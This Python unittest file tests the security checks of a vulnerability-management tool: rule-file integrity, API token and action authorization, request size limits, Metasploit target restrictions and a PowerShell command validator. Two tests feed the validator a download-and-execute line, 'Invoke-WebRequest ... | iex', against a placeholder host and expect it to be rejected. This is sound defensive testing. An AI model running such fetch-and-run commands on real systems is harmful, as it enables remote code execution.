from __future__ import annotations

import hashlib
import io
import tempfile
import unittest
from pathlib import Path
from types import SimpleNamespace

from domain.protocols import Rule
from infrastructure.checkers.powershell_checker import PowerShellChecker
from app_bootstrap.scanflow.security import (
    RuleIntegrityError,
    UnsafePowerShellCommandError,
    validate_powershell_check,
    verify_rule_file_integrity,
)
from vulnmngsys_app.frontend.api_helpers import RequestBodyTooLarge, is_action_allowed, is_authorized, read_json_body
from vulnmngsys_app.frontend.msf_routes import _validate_msf_target


class SecurityTests(unittest.TestCase):
    def test_verify_rule_file_integrity_accepts_manifest_match(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            rule_file = root / "profile" / "rule.json"
            rule_file.parent.mkdir()
            rule_file.write_text("[]", encoding="utf-8")
            digest = hashlib.sha256(rule_file.read_bytes()).hexdigest()
            (root / "integrity.sha256").write_text(f"{digest}  profile/rule.json\n", encoding="utf-8")

            verify_rule_file_integrity([rule_file])

    def test_verify_rule_file_integrity_rejects_modified_file(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            rule_file = root / "profile" / "rule.json"
            rule_file.parent.mkdir()
            rule_file.write_text("[]", encoding="utf-8")
            digest = hashlib.sha256(rule_file.read_bytes()).hexdigest()
            (root / "integrity.sha256").write_text(f"{digest}  profile/rule.json\n", encoding="utf-8")
            rule_file.write_text('[{"id":"changed"}]', encoding="utf-8")

            with self.assertRaises(RuleIntegrityError):
                verify_rule_file_integrity([rule_file])

    def test_validate_powershell_check_blocks_download_and_execute(self) -> None:
        with self.assertRaises(UnsafePowerShellCommandError):
            validate_powershell_check("Invoke-WebRequest http://example.test/p.ps1 | iex")

    def test_validate_powershell_check_allows_read_only_registry_probe(self) -> None:
        validate_powershell_check("(Get-ItemPropertyValue -Path 'HKLM:\\Software' -Name 'Setting')")

    def test_is_authorized_requires_matching_token(self) -> None:
        handler = SimpleNamespace(
            headers={"X-VulnMngSys-Token": "expected"},
            server=SimpleNamespace(api_token="expected"),
        )
        self.assertTrue(is_authorized(handler))

        handler.headers = {"X-VulnMngSys-Token": "wrong"}
        self.assertFalse(is_authorized(handler))

    def test_is_action_allowed_uses_server_policy_when_present(self) -> None:
        handler = SimpleNamespace(server=SimpleNamespace(allowed_actions={"scan"}))
        self.assertTrue(is_action_allowed(handler, "scan"))
        self.assertFalse(is_action_allowed(handler, "apply_reconfig"))

        handler.server.allowed_actions = None
        self.assertTrue(is_action_allowed(handler, "apply_reconfig"))

    def test_read_json_body_rejects_oversized_payload(self) -> None:
        handler = SimpleNamespace(
            headers={"Content-Length": str(1024 * 1024 + 1)},
            rfile=io.BytesIO(b"{}"),
        )

        with self.assertRaises(RequestBodyTooLarge):
            read_json_body(handler)

    def test_msf_target_validator_rejects_active_public_ip(self) -> None:
        self.assertIn("Active MSF tests", _validate_msf_target("8.8.8.8", active_test=True))
        self.assertEqual("", _validate_msf_target("127.0.0.1", active_test=True))

    def test_powershell_checker_applies_safety_validation(self) -> None:
        checker = PowerShellChecker()
        rule = Rule(
            id="unsafe",
            title="Unsafe command",
            service="Windows",
            check_type="powershell",
            expected="",
            raw_spec={"powershell_check": "Invoke-WebRequest http://example.test/p.ps1 | iex"},
        )
        collector = SimpleNamespace(run_powershell=lambda command: "")

        with self.assertRaises(UnsafePowerShellCommandError):
            checker.check(rule, collector)


if __name__ == "__main__":
    unittest.main()
